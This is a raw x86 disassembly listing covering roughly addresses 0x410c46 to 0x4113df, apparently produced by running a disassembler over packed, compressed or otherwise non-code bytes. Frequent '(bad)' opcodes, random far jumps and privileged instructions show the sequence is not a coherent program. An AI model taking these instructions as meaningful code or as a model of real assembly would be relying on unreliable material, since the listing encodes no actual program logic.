  410c46:	ss loope 0x410c3b
  410c49:	div    BYTE PTR [edi*4+0x89c81b]
  410c50:	add    bl,dh
  410c52:	xchg   ebx,edi
  410c54:	pop    eax
  410c55:	lds    esi,FWORD PTR [eax-0x4a000d3b]
  410c5b:	jne    0x410c2e
  410c5d:	cdq    
  410c5e:	es add eax,0x1c80fc54
  410c64:	add    BYTE PTR [eax],al
  410c66:	sub    BYTE PTR [ecx+0x0],0x0
  410c6a:	jl     0x410c05
  410c6c:	cmp    eax,0xa20a8f61
  410c71:	push   ss
  410c72:	(bad)  
  410c73:	test   ebp,0xf7a871e7
  410c79:	ds or  eax,0x9a4af8e8
  410c7f:	sti    
  410c80:	icebp  
  410c81:	ja     0x410c40
  410c83:	mov    eax,ds:0x64f162e9
  410c88:	push   esp
  410c89:	push   ss
  410c8a:	sti    
  410c8b:	jmp    0xbf91:0x3a34714d
  410c92:	sub    eax,0xfbfb2a9c
  410c97:	push   eax
  410c98:	mov    dh,0x44
  410c9a:	imul   eax,DWORD PTR [eax],0x0
  410c9d:	bound  ecx,QWORD PTR [eax-0x58]
  410ca0:	add    BYTE PTR [eax],al
  410ca2:	shl    DWORD PTR [ebx],0x8a
  410ca5:	test   BYTE PTR [ecx+0x0],bh
  410ca8:	add    BYTE PTR [eax-0x78],al
  410cab:	add    BYTE PTR [eax],al
  410cad:	add    dl,ch
  410caf:	push   edx
  410cb0:	fisttp QWORD PTR [eax+0x60000d7]
  410cb6:	test   DWORD PTR [ebx-0x6e],esi
  410cb9:	enter  0xf4,0x0
  410cbd:	pop    eax
  410cbe:	cmp    al,0xe8
  410cc0:	sbb    al,0x8e
  410cc2:	outs   dx,DWORD PTR ds:[esi]
  410cc3:	arpl   WORD PTR [ebx+edx*2],bx
  410cc6:	and    eax,0x5994f9c5
  410ccb:	fisubr WORD PTR [edx-0x77]
  410cce:	push   ss
  410ccf:	(bad)  
  410cd0:	sbb    BYTE PTR [ebx-0x68],0x3e
  410cd4:	xor    ah,dh
  410cd6:	and    BYTE PTR ds:0xc04aac89,al
  410cdc:	fild   DWORD PTR [eax]
  410cde:	add    al,bh
  410ce0:	hlt    
  410ce1:	hlt    
  410ce2:	jp     0x410cb0
  410ce4:	test   DWORD PTR [eax],0x4ed07b00
  410cea:	cmp    BYTE PTR [ecx+0x660c74b],bl
  410cf0:	sbb    ebp,edi
  410cf2:	aad    0x5e
  410cf4:	inc    ebp
  410cf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410cf6:	mov    dh,0xe
  410cf8:	fbstp  TBYTE PTR [ebx]
  410cfa:	jmp    0x59f5:0x9aafbc32
  410d01:	shl    DWORD PTR [edi],1
  410d03:	jl     0x410ce7
  410d05:	and    edx,esi
  410d07:	pop    edx
  410d08:	out    dx,eax
  410d09:	(bad)  
  410d0b:	inc    esi
  410d0c:	mov    ebp,cs
  410d0e:	add    BYTE PTR [eax],al
  410d10:	mov    cl,0x5
  410d12:	or     ebx,DWORD PTR [ebp-0x55]
  410d15:	lock inc ecx
  410d17:	jnp    0x410cd4
  410d19:	mov    edx,0xc885a84d
  410d1e:	mov    al,ds:0xd6c40000
  410d23:	add    BYTE PTR [eax],al
  410d25:	and    bl,BYTE PTR [eax-0x3c]
  410d28:	sbb    DWORD PTR [eax],eax
  410d2a:	add    BYTE PTR ds:0xa2273206,al
  410d30:	(bad)  
  410d32:	push   eax
  410d33:	sbb    edx,ecx
  410d35:	int3   
  410d36:	out    dx,eax
  410d37:	add    BYTE PTR [eax],al
  410d39:	jo     0x410d0d
  410d3b:	cwde   
  410d3c:	sbb    al,0x84
  410d3e:	adc    al,BYTE PTR [eax]
  410d40:	add    BYTE PTR [ebx],dl
  410d42:	sahf   
  410d43:	adc    eax,DWORD PTR [esi]
  410d45:	xor    al,0xb5
  410d47:	test   eax,0xad3a655a
  410d4c:	ss jbe 0x410d59
  410d4f:	jae    0x410d03
  410d51:	fmulp  st(4),st
  410d53:	inc    ebp
  410d54:	add    BYTE PTR [eax],al
  410d56:	ins    DWORD PTR es:[edi],dx
  410d57:	nop
  410d58:	mov    ebx,DWORD PTR [eax]
  410d5a:	jge    0x410da9
  410d5c:	inc    eax
  410d5d:	rol    DWORD PTR [eax],1
  410d5f:	add    BYTE PTR [edi-0x428fc7e],cl
  410d65:	inc    edi
  410d66:	hlt    
  410d67:	push   ebx
  410d68:	mov    bh,0xef
  410d6a:	dec    edx
  410d6b:	dec    ebp
  410d6c:	ins    DWORD PTR es:[edi],dx
  410d6d:	inc    ebp
  410d6e:	pop    ds
  410d6f:	retf   0x3f2d
  410d72:	mov    edi,0x75f42ae8
  410d77:	imul   esp,DWORD PTR [ecx-0x37],0xffffff83
  410d7b:	fs in  eax,dx
  410d7d:	mov    gs,edx
  410d7f:	ror    DWORD PTR [ecx+0x17e5212e],0xab
  410d86:	test   DWORD PTR [ebp+0x5d4629f2],ebx
  410d8c:	mov    ebp,0x99db0a3b
  410d91:	inc    edi
  410d92:	xchg   esp,eax
  410d93:	fcom   QWORD PTR [esi-0xb]
  410d96:	push   0x866b24e0
  410d9b:	inc    eax
  410d9c:	lds    eax,FWORD PTR [eax]
  410d9e:	add    BYTE PTR [edi+0x11],ch
  410da1:	mov    dl,0xef
  410da3:	fisub  DWORD PTR [ecx-0x6a]
  410da6:	inc    ebx
  410da7:	xor    ch,BYTE PTR [esi]
  410da9:	mov    edi,DWORD PTR [esp+ebp*2]
  410dac:	xor    al,BYTE PTR [esi]
  410dae:	sub    eax,edx
  410db0:	call   0xe90:0x951cb7f5
  410db7:	and    DWORD PTR [ebp+0x40b2599b],0xffffff86
  410dbe:	add    BYTE PTR [eax],al
  410dc0:	ins    DWORD PTR es:[edi],dx
  410dc1:	xchg   ebp,eax
  410dc2:	ret    0x2655
  410dc5:	sar    bh,1
  410dc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410dc8:	xchg   BYTE PTR [ebx-0x18c84241],al
  410dce:	pop    edx
  410dcf:	push   0x4d
  410dd1:	pop    es
  410dd2:	call   0x2541:0xd01a2de3
  410dd9:	sub    DWORD PTR [edi+0x12],esi
  410ddc:	mov    bh,dl
  410dde:	add    BYTE PTR [eax],al
  410de0:	sbb    BYTE PTR [eax],cl
  410de2:	mov    ecx,0x5e750000
  410de7:	aam    0x4e
  410de9:	dec    edx
  410dea:	enter  0x69,0x0
  410dee:	in     eax,0x71
  410df0:	or     esp,DWORD PTR [ebp+0x1dded9d9]
  410df6:	imul   edx,DWORD PTR [ebp+0x39abab33],0x74a35eec
  410e00:	push   es
  410e01:	and    BYTE PTR [edi+0x105e23fd],bl
  410e07:	ror    edx,cl
  410e09:	cmp    al,0x13
  410e0b:	jo     0x410daa
  410e0d:	add    ah,ah
  410e0f:	add    BYTE PTR [eax],al
  410e11:	retf   0x85b5
  410e14:	adc    eax,0x4c62dea0
  410e19:	fild   DWORD PTR [eax]
  410e1b:	add    bl,al
  410e1d:	imul   ebp,DWORD PTR [edi],0x64
  410e20:	jne    0x410e05
  410e22:	les    ebx,FWORD PTR [ebp+0x208e0000]
  410e28:	popf   
  410e29:	xchg   ebp,eax
  410e2a:	push   ss
  410e2b:	rcr    BYTE PTR [eax],1
  410e2d:	int3   
  410e2e:	jno    0x410e30
  410e30:	add    BYTE PTR [ebx-0xe],bh
  410e33:	pop    ecx
  410e34:	es xchg edx,eax
  410e36:	push   edi
  410e37:	xchg   esi,eax
  410e38:	std    
  410e39:	cmp    ch,BYTE PTR [eax+0xdd80bf]
  410e3f:	add    BYTE PTR [ecx-0x46],ch
  410e42:	test   edx,ecx
  410e44:	fwait
  410e45:	inc    ebp
  410e46:	nop
  410e47:	xchg   esi,eax
  410e48:	retf   
  410e49:	popf   
  410e4a:	jnp    0x410eb1
  410e4c:	sti    
  410e4d:	fild   DWORD PTR [edx-0x154e8630]
  410e53:	pop    esp
  410e54:	dec    esp
  410e55:	dec    ebx
  410e56:	add    BYTE PTR [eax],al
  410e58:	push   esp
  410e59:	and    ch,bl
  410e5b:	xchg   ax,ax
  410e5d:	bound  edi,QWORD PTR [ebp+0x13]
  410e60:	pop    esp
  410e61:	fcmove st,st(0)
  410e63:	cmp    eax,0x23a20000
  410e68:	hlt    
  410e69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e6a:	jno    0x410e8b
  410e6c:	sbb    dl,BYTE PTR [edi+0x1ae94f5a]
  410e72:	add    BYTE PTR ds:0xe6100000,bl
  410e78:	mov    DWORD PTR [ebx-0x5e102bda],eax
  410e7e:	aam    0xa6
  410e80:	in     eax,dx
  410e81:	adc    DWORD PTR [eax-0x786dd1ec],esi
  410e87:	out    0x1,eax
  410e89:	pop    ebx
  410e8a:	add    eax,0xf7ed533
  410e8f:	sbb    al,0x7b
  410e91:	push   ebp
  410e92:	sub    eax,0xf7f61a4e
  410e97:	jo     0x410e1d
  410e99:	dec    esp
  410e9a:	add    BYTE PTR [eax],al
  410e9c:	mov    ch,0xd9
  410e9e:	gs fldpi 
  410ea1:	push   ebx
  410ea2:	adc    BYTE PTR [edi],0x0
  410ea5:	add    BYTE PTR [esi],dh
  410ea7:	pop    ds
  410ea8:	push   ebp
  410ea9:	sti    
  410eaa:	jecxz  0x410e88
  410eac:	ins    DWORD PTR es:[edi],dx
  410ead:	sub    eax,0x54cf5206
  410eb2:	leave  
  410eb3:	sub    eax,0xf49bee51
  410eb8:	call   0x4e83f22f
  410ebd:	xor    ah,bh
  410ebf:	cmp    al,0x99
  410ec1:	test   BYTE PTR [eax+eax*1+0x0],al
  410ec5:	addr16 rol cl,0x0
  410ec9:	add    BYTE PTR [ebx],ch
  410ecb:	mov    al,ds:0x9ed87e6a
  410ed0:	int    0xca
  410ed2:	(bad)  
  410ed3:	ficomp DWORD PTR [ecx-0x7d83dc4d]
  410ed9:	out    0x40,eax
  410edb:	retf   0x0
  410ede:	iret   
  410edf:	xchg   edi,eax
  410ee0:	push   ebp
  410ee1:	test   eax,0xf4eecb51
  410ee6:	xlat   BYTE PTR ds:[ebx]
  410ee7:	push   es
  410ee8:	push   0x49d34fb5
  410eed:	or     BYTE PTR [ebx+0x1c180000],dh
  410ef3:	mov    DWORD PTR [esi],esp
  410ef5:	inc    ebx
  410ef6:	sub    eax,0x828ce3
  410efb:	add    BYTE PTR [eax],bl
  410efd:	aaa    
  410efe:	ret    0x5497
  410f01:	lods   eax,DWORD PTR ds:[esi]
  410f02:	xchg   BYTE PTR [ecx+0x33e8b0be],dh
  410f08:	pusha  
  410f09:	js     0x410e9b
  410f0b:	mov    al,0xfb
  410f0d:	xchg   ebx,eax
  410f0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f0f:	imul   DWORD PTR [ecx-0x2c066141]
  410f15:	in     al,dx
  410f16:	jmp    0x72746b80
  410f1b:	jge    0x410f4a
  410f1d:	shl    BYTE PTR [eax+eax*1+0x0],0x64
  410f22:	mov    bl,0xbb
  410f24:	jmp    DWORD PTR [eax]
  410f26:	ins    DWORD PTR es:[edi],dx
  410f27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f28:	ret    0x3777
  410f2b:	bound  eax,QWORD PTR [ecx-0x5dc11dc]
  410f31:	in     al,0x29
  410f33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f34:	mov    WORD PTR [edx-0x14ba0000],ss
  410f3a:	lahf   
  410f3b:	cmp    esp,DWORD PTR [ecx]
  410f3d:	clc    
  410f3e:	lock shl bl,0x0
  410f42:	add    BYTE PTR [edx],dl
  410f44:	cmp    ecx,edi
  410f46:	xor    dh,BYTE PTR [esi+0x54838968]
  410f4c:	es xchg edx,eax
  410f4e:	aaa    
  410f4f:	xchg   edi,eax
  410f50:	fisub  WORD PTR [ebp+0x71c0795c]
  410f56:	add    BYTE PTR [eax],al
  410f58:	fsub   QWORD PTR [edi]
  410f5a:	inc    edx
  410f5b:	ja     0x410f21
  410f5d:	stc    
  410f5e:	add    BYTE PTR [eax],al
  410f60:	or     BYTE PTR [edi+0x398a0000],dl
  410f66:	inc    eax
  410f67:	lds    eax,FWORD PTR [eax]
  410f69:	add    BYTE PTR [esi+0x76695ae],al
  410f6f:	jg     0x410fa1
  410f71:	jns    0x410fc3
  410f73:	add    bh,BYTE PTR [ecx-0x426cbcc]
  410f79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f7a:	(bad)  
  410f7b:	hlt    
  410f7c:	(bad)  
  410f7d:	sbb    eax,0xe744edb6
  410f82:	add    BYTE PTR [eax],al
  410f84:	jg     0x410f97
  410f86:	dec    esp
  410f87:	in     eax,dx
  410f88:	add    BYTE PTR [eax],al
  410f8a:	bound  esi,QWORD PTR ds:0x80307543
  410f90:	in     al,0x0
  410f92:	add    dh,bh
  410f94:	loop   0x410fc0
  410f96:	pop    ebp
  410f97:	xchg   ebx,eax
  410f98:	push   es
  410f99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f9a:	cld    
  410f9b:	rcr    BYTE PTR [edi],0x0
  410f9e:	add    BYTE PTR [ecx-0x17],ch
  410fa1:	jge    0x410ff9
  410fa3:	push   edx
  410fa4:	fwait
  410fa5:	inc    ebx
  410fa6:	fs loop 0x411018
  410fa9:	add    eax,0xd6495f59
  410fae:	aad    0xd0
  410fb0:	add    eax,0xddcb92b5
  410fb5:	inc    ebp
  410fb6:	add    DWORD PTR [esi+0x1704017f],ecx
  410fbc:	add    BYTE PTR [eax],al
  410fbe:	push   edx
  410fbf:	test   al,0xc8
  410fc1:	xor    DWORD PTR [eax],eax
  410fc3:	add    BYTE PTR [ebx],al
  410fc5:	add    esi,esp
  410fc7:	lahf   
  410fc8:	retf   0x7315
  410fcb:	scas   eax,DWORD PTR es:[edi]
  410fcc:	aad    0xfc
  410fce:	xor    DWORD PTR [esi+0x63],ebp
  410fd1:	out    0x87,eax
  410fd3:	mov    eax,0x77520649
  410fd8:	sti    
  410fd9:	add    eax,esp
  410fdb:	xor    eax,DWORD PTR [eax]
  410fdd:	add    dh,dl
  410fdf:	sub    esi,DWORD PTR [ecx-0xb293a07]
  410fe5:	jmp    0x20b2:0x9fd2deb1
  410fec:	fwait
  410fed:	cmc    
  410fee:	mov    dh,0x8c
  410ff0:	jmp    0xfb1c0ff5
  410ff5:	mov    ds:0xbdc6f1a2,al
  410ffa:	add    dl,BYTE PTR [edx+0x18]
  410ffd:	stc    
  410ffe:	jae    0x411046
  411000:	pop    esi
  411001:	dec    ebx
  411002:	cdq    
  411003:	xchg   DWORD PTR [ecx-0x1bfd2da4],ebx
  411009:	test   ch,cl
  41100b:	add    BYTE PTR [eax],al
  41100d:	jne    0x411019
  41100f:	pop    ss
  411010:	rcr    BYTE PTR [edx-0x67260000],0xfe
  411017:	jnp    0x411071
  411019:	(bad)  
  41101b:	or     bh,cl
  41101d:	add    BYTE PTR [eax],al
  41101f:	js     0x411089
  411021:	mov    bl,0x9b
  411023:	dec    esp
  411024:	sbb    eax,0xb0860000
  411029:	dec    eax
  41102a:	jmp    0x2d45:0xd8f80000
  411031:	fisttp WORD PTR [ebx-0x21]
  411034:	es jmp 0x410fd8
  411037:	mov    dl,0x8e
  411039:	xchg   edx,eax
  41103a:	dec    eax
  41103b:	xlat   BYTE PTR ds:[ebx]
  41103c:	add    BYTE PTR [eax],al
  41103e:	or     al,0xae
  411040:	add    BYTE PTR [eax],al
  411042:	aam    0x64
  411044:	adc    bl,al
  411046:	sub    eax,0xbd046c
  41104b:	add    dl,bl
  41104d:	dec    ebp
  41104e:	lock out dx,eax
  411050:	popf   
  411051:	aas    
  411052:	lods   al,BYTE PTR ds:[esi]
  411053:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411054:	outs   dx,DWORD PTR ds:[esi]
  411055:	xchg   esp,eax
  411056:	cmc    
  411057:	bound  edx,QWORD PTR [esi]
  411059:	and    DWORD PTR [eax],edx
  41105b:	cdq    
  41105c:	les    ebx,FWORD PTR ds:0x70390000
  411062:	mov    bl,BYTE PTR [ecx+0x72ae07ab]
  411068:	push   ss
  411069:	mov    ecx,0x59ba0b38
  41106f:	mov    ebx,0x4656822a
  411074:	cmp    eax,0xa140
  411079:	add    BYTE PTR [edx],0x4f
  41107c:	outs   dx,DWORD PTR ds:[esi]
  41107d:	cdq    
  41107e:	xlat   BYTE PTR ds:[ebx]
  41107f:	push   ebx
  411080:	(bad)  
  411081:	jbe    0x4110db
  411083:	bound  eax,QWORD PTR [ecx-0x39]
  411086:	inc    ecx
  411087:	pop    es
  411088:	ins    BYTE PTR es:[edi],dx
  411089:	ror    WORD PTR ds:0xc9c8,0xd3
  411091:	out    dx,eax
  411092:	or     ah,BYTE PTR [ebp+0x6]
  411095:	and    eax,edi
  411097:	enter  0x26,0x0
  41109b:	ret    
  41109c:	add    edi,edi
  41109e:	xchg   ecx,eax
  41109f:	fldcw  WORD PTR [edx]
  4110a1:	pushf  
  4110a2:	xchg   DWORD PTR ds:[ebx-0x632d0b5d],ecx
  4110a9:	push   cs
  4110aa:	mov    edx,fs
  4110ac:	add    BYTE PTR [eax],al
  4110ae:	fstp   TBYTE PTR [ebx+ebp*1+0x4ba0bd30]
  4110b5:	and    DWORD PTR [esp+ecx*1+0x7000029],edx
  4110bc:	pop    ecx
  4110bd:	xor    dl,BYTE PTR [ebx]
  4110bf:	push   edi
  4110c0:	mov    eax,ds:0xd160e589
  4110c5:	sar    DWORD PTR [eax-0x2b],1
  4110c8:	fadd   DWORD PTR [edx]
  4110ca:	cmp    al,0x23
  4110cc:	pop    edx
  4110cd:	jle    0x4110e6
  4110cf:	push   edx
  4110d0:	push   edx
  4110d1:	pop    esi
  4110d2:	xchg   ecx,eax
  4110d3:	inc    ebx
  4110d4:	inc    ebx
  4110d5:	jg     0x4110c9
  4110d7:	adc    BYTE PTR [ebp+0x4ae55c63],al
  4110dd:	mov    ah,0x18
  4110df:	sar    DWORD PTR [ecx+ebx*8],0x8c
  4110e3:	mov    esi,0x1fe50000
  4110e8:	cld    
  4110e9:	(bad)  
  4110ea:	fadd   DWORD PTR [ebp-0x4d]
  4110ed:	jae    0x411114
  4110ef:	gs adc al,0x3a
  4110f2:	or     al,0x93
  4110f4:	add    BYTE PTR [eax],al
  4110f6:	mov    bh,BYTE PTR [edi+0xab9e317]
  4110fc:	(bad)  
  4110fd:	stos   DWORD PTR es:[edi],eax
  4110fe:	push   0xffffff9e
  411100:	pop    eax
  411101:	push   eax
  411102:	sbb    dl,BYTE PTR [ecx]
  411104:	aad    0x4e
  411106:	retf   0xf1d
  411109:	dec    edx
  41110a:	push   edx
  41110b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41110c:	push   esp
  41110d:	cli    
  41110e:	cdq    
  41110f:	repz xchg esp,eax
  411111:	jno    0x4110c8
  411113:	repz push esp
  411115:	pop    ecx
  411116:	ret    0x9973
  411119:	jmp    0x411190
  41111b:	mov    ds:0x97c78acd,al
  411120:	sbb    al,0x52
  411122:	rcr    DWORD PTR [edi+ebx*1],0x31
  411126:	bound  edx,QWORD PTR ds:0x4fd5f170
  41112c:	dec    esi
  41112d:	mov    ebx,0xc004
  411132:	or     edx,ebx
  411134:	arpl   WORD PTR [esi+edi*4+0x13300000],cx
  41113b:	outs   dx,DWORD PTR ds:[esi]
  41113c:	jmp    0xa5a8:0xa908
  411143:	mov    edi,0xf3d2e394
  411148:	sub    eax,0x8290256
  41114d:	hlt    
  41114e:	add    BYTE PTR [eax],al
  411150:	lods   al,BYTE PTR ds:[esi]
  411151:	adc    ah,BYTE PTR [eax]
  411153:	jmp    0xdff2:0x45ea7d42
  41115a:	mov    bh,0x86
  41115c:	and    eax,0xd810c9cd
  411161:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411162:	cld    
  411163:	add    DWORD PTR [eax+0x44],edi
  411166:	mov    esi,0x9320000
  41116b:	cli    
  41116c:	dec    esp
  41116d:	mov    ebp,0x6fb10000
  411172:	fidiv  DWORD PTR [edx+0x5c2afa73]
  411178:	cmp    ecx,ebx
  41117a:	sbb    al,0xba
  41117c:	push   ds
  41117d:	shl    ebp,cl
  41117f:	mov    bl,0xdd
  411181:	mov    dl,BYTE PTR [esi+0x18]
  411184:	jbe    0x4111d1
  411186:	and    al,0x4e
  411188:	jge    0x4111ad
  41118a:	sub    eax,0x3fcc7b
  41118f:	add    BYTE PTR [edx],bl
  411191:	neg    DWORD PTR [ecx+0x49]
  411194:	inc    esp
  411195:	lock add BYTE PTR [eax],al
  411198:	sub    esp,DWORD PTR [ebp+0x5]
  41119b:	mov    edi,0x4297d1cb
  4111a0:	inc    edx
  4111a1:	sbb    ah,bl
  4111a3:	xchg   esp,esi
  4111a5:	pop    esp
  4111a6:	and    BYTE PTR [ecx+0x415f110f],ah
  4111ac:	mov    dh,0x80
  4111ae:	add    BYTE PTR es:[eax],al
  4111b1:	cs push eax
  4111b3:	pop    ds
  4111b4:	dec    ebx
  4111b5:	in     eax,0x6c
  4111b7:	dec    esi
  4111b8:	or     al,0xbe
  4111ba:	add    BYTE PTR [eax],al
  4111bc:	xchg   edx,eax
  4111bd:	mov    ch,0x3d
  4111bf:	ficom  WORD PTR [esi]
  4111c1:	or     DWORD PTR [ebx-0x14],esi
  4111c4:	leave  
  4111c5:	add    BYTE PTR [ebx],ch
  4111c7:	add    BYTE PTR [eax],al
  4111c9:	jmp    0x41117d
  4111cb:	or     eax,0xfc13572f
  4111d0:	and    ebp,DWORD PTR [eax+0x62]
  4111d3:	jp     0x411177
  4111d5:	push   ebx
  4111d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111d7:	push   edx
  4111d8:	test   BYTE PTR [edi],dh
  4111da:	add    BYTE PTR [eax],al
  4111dc:	xchg   dx,ax
  4111de:	mov    eax,DWORD PTR [edx-0x6c1accb5]
  4111e4:	push   eax
  4111e5:	(bad)
  4111e9:	jnp    0x4111af
  4111eb:	jge    0x4111ed
  4111ed:	add    BYTE PTR [edx+0x31],al
  4111f0:	sub    ebx,DWORD PTR [ebx-0x4f]
  4111f3:	cmp    al,0x1b
  4111f5:	stos   BYTE PTR es:[edi],al
  4111f6:	sub    ebp,DWORD PTR [edx]
  4111f8:	call   0x85e5ba0e
  4111fd:	out    dx,eax
  4111fe:	mov    ah,bh
  411200:	add    BYTE PTR [eax],al
  411202:	pop    ebx
  411203:	adc    ebp,ebp
  411205:	cdq    
  411206:	cs xchg ebx,eax
  411208:	inc    esp
  411209:	lods   eax,DWORD PTR ds:[esi]
  41120a:	add    BYTE PTR [eax],al
  41120c:	pop    ecx
  41120d:	dec    ecx
  41120e:	iret   
  41120f:	(bad)  
  411210:	mov    ebx,0x95bcc1b5
  411215:	adc    ebx,DWORD PTR [edi-0x3b]
  411218:	xchg   esp,eax
  411219:	mov    dl,0x58
  41121b:	popf   
  41121c:	xchg   BYTE PTR [edx-0x296ca182],dl
  411222:	or     DWORD PTR [ebx+0x4d],edi
  411225:	jle    0x41123f
  411227:	mov    dl,0x74
  411229:	repnz test al,0xa8
  41122c:	pushf  
  41122d:	cmc    
  41122e:	call   0x1fd1331c
  411233:	jp     0x411298
  411235:	pushf  
  411236:	adc    ebp,DWORD PTR [ebx]
  411238:	repz jo 0x4111d2
  41123b:	or     edx,DWORD PTR [ecx-0x6b]
  41123e:	sbb    BYTE PTR [ecx+0x54],ch
  411241:	loop   0x411277
  411243:	(bad)  
  411244:	xor    bh,BYTE PTR [ecx-0x1de62653]
  41124a:	mov    ch,0x8a
  41124c:	(bad)  
  41124d:	rol    BYTE PTR [ecx],cl
  41124f:	push   edi
  411250:	jne    0x4111ef
  411252:	xchg   edi,eax
  411253:	test   BYTE PTR [eax],0xd
  411256:	add    BYTE PTR [eax],al
  411258:	int    0x16
  41125a:	aaa    
  41125b:	cmp    DWORD PTR [ebp+0xc140],esp
  411261:	mov    bl,0x3e
  411263:	pop    ds
  411264:	mov    ds:0x83bb2dfa,eax
  411269:	dec    eax
  41126a:	add    al,0x0
  41126c:	add    BYTE PTR [edi-0x29c72bca],dh
  411272:	gs ret 0x9ee9
  411276:	inc    ebx
  411277:	aad    0x26
  411279:	sub    al,0x6b
  41127b:	leave  
  41127c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41127d:	in     eax,0x8c
  41127f:	outs   dx,DWORD PTR ds:[esi]
  411280:	add    BYTE PTR [eax],al
  411282:	cwde   
  411283:	mov    ebp,0x14db1b1f
  411288:	mov    ds:0x130001,al
  41128d:	add    BYTE PTR [ebp+eiz*2-0x306d51a3],dh
  411294:	mov    eax,ds:0xe40010
  411299:	add    ch,dl
  41129b:	test   eax,ebp
  41129d:	ja     0x411221
  41129f:	fwait
  4112a0:	inc    esi
  4112a1:	dec    eax
  4112a2:	mov    al,ds:0x66b30000
  4112a7:	jle    0x4112dc
  4112a9:	and    al,0xbc
  4112ab:	sbb    BYTE PTR [eax],dl
  4112ad:	adc    BYTE PTR [edi+0x2dae673a],cl
  4112b3:	dec    esp
  4112b4:	stos   BYTE PTR es:[edi],al
  4112b5:	add    BYTE PTR [eax],al
  4112b7:	dec    eax
  4112b8:	pop    eax
  4112b9:	add    BYTE PTR [eax],al
  4112bb:	rcl    DWORD PTR [ebx+0x5225b3ea],0x16
  4112c2:	stos   BYTE PTR es:[edi],al
  4112c3:	test   BYTE PTR [ecx+0x29490000],cl
  4112c9:	mov    ch,0xb
  4112cb:	jecxz  0x4112f7
  4112cd:	cmp    ebx,DWORD PTR [edi+0x69]
  4112d0:	in     al,dx
  4112d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112d2:	ins    DWORD PTR es:[edi],dx
  4112d3:	mov    ch,0x65
  4112d5:	aas    
  4112d6:	push   ebx
  4112d7:	fwait
  4112d8:	mov    edx,0x86969ea8
  4112dd:	or     WORD PTR [edi],0xe26d
  4112e2:	push   ds
  4112e3:	mov    dh,0x3c
  4112e5:	not    BYTE PTR [ecx-0x74b9dc11]
  4112eb:	std    
  4112ec:	sti    
  4112ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112ee:	jmp    0x5:0xc0360e74
  4112f5:	add    bl,al
  4112f7:	cmp    DWORD PTR [edi+0x69],eax
  4112fa:	xchg   ebp,eax
  4112fb:	mov    bl,0xdf
  4112fd:	xchg   edx,eax
  4112fe:	push   edx
  4112ff:	mov    bh,0xf7
  411301:	ror    BYTE PTR [edx-0x1b931eb5],cl
  411307:	(bad)  
  411308:	nop
  411309:	sub    BYTE PTR [edi+edx*1],bl
  41130c:	mov    ecx,DWORD PTR [ecx+edi*2-0x37920000]
  411313:	lahf   
  411314:	add    BYTE PTR [eax],al
  411316:	test   ebp,eax
  411318:	cld    
  411319:	sahf   
  41131a:	sahf   
  41131b:	shr    BYTE PTR [eax+0xf],1
  41131e:	sub    BYTE PTR [ecx-0xe],dl
  411321:	jle    0x41134a
  411323:	outs   dx,DWORD PTR ds:[esi]
  411324:	nop
  411325:	pop    edx
  411326:	cdq    
  411327:	push   0x4d
  411329:	mov    ecx,ebp
  41132b:	sbb    eax,0x54315c35
  411330:	lods   eax,DWORD PTR ds:[esi]
  411331:	mov    ch,0xc5
  411333:	dec    eax
  411334:	std    
  411335:	add    BYTE PTR [eax],al
  411337:	pop    edi
  411338:	push   ebp
  411339:	outs   dx,DWORD PTR ds:[esi]
  41133a:	lea    esp,[ecx+0x1a]
  41133d:	jnp    0x411393
  41133f:	out    dx,eax
  411340:	inc    esp
  411341:	cmp    al,0x0
  411343:	add    BYTE PTR [eax+ebx*1-0xc3665e4],ah
  41134a:	lods   al,BYTE PTR ds:[esi]
  41134b:	jp     0x411341
  41134d:	bound  esp,QWORD PTR [edi]
  41134f:	icebp  
  411350:	mov    dh,0x6
  411352:	fnstenv [ebx+0x48]
  411355:	jl     0x411357
  411357:	add    BYTE PTR ds:0xea573b9,dh
  41135d:	bound  ebp,QWORD PTR [edi-0x7fbe6506]
  411363:	icebp  
  411364:	add    BYTE PTR [eax],al
  411366:	xchg   ecx,eax
  411367:	mov    eax,0x4c9a7f9
  41136c:	js     0x41136e
  41136e:	add    BYTE PTR [ebx+0x7c],al
  411371:	retf   0xbc36
  411374:	fs mov ecx,0xeab1852
  41137a:	mov    esi,0x49ef4eae
  41137f:	sub    ebx,DWORD PTR [ecx-0x46aafa12]
  411385:	dec    ebx
  411386:	fs jg  0x411408
  411389:	push   es
  41138a:	ins    DWORD PTR es:[edi],dx
  41138b:	add    DWORD PTR [ecx-0x3a06ef7],edi
  411391:	jecxz  0x411392
  411393:	ret    0xf928
  411396:	mov    dl,0xf8
  411398:	fimul  WORD PTR cs:[ebx+0x12]
  41139c:	cmp    DWORD PTR gs:[ebx+0xb4fbdb6],ecx
  4113a3:	repnz mov al,0x82
  4113a6:	jb     0x411385
  4113a8:	xchg   DWORD PTR [eax-0x3ee35289],edi
  4113ae:	push   esp
  4113af:	aas    
  4113b0:	fistp  DWORD PTR [ebx+0x29]
  4113b3:	pop    esp
  4113b4:	icebp  
  4113b5:	xchg   DWORD PTR [ebp+0x2ff6e72a],edx
  4113bb:	cli    
  4113bc:	xchg   DWORD PTR [ebx+0x3b],edx
  4113bf:	push   0x8
  4113c1:	int    0x0
  4113c3:	add    BYTE PTR [esp+ecx*1-0x67ffff4f],dh
  4113ca:	mov    eax,es:0xa11fca6a
  4113d0:	daa    
  4113d1:	outs   dx,DWORD PTR ds:[esi]
  4113d2:	jp     0x4113c8
  4113d4:	sar    ecx,cl
  4113d6:	sbb    DWORD PTR [esi+eax*1],ebp
  4113d9:	in     eax,dx
  4113da:	and    DWORD PTR [edx+0x1d],esp
  4113dd:	icebp  
  4113de:	dec    edx
  4113df:	jmp    0xa779:0x675bc17b
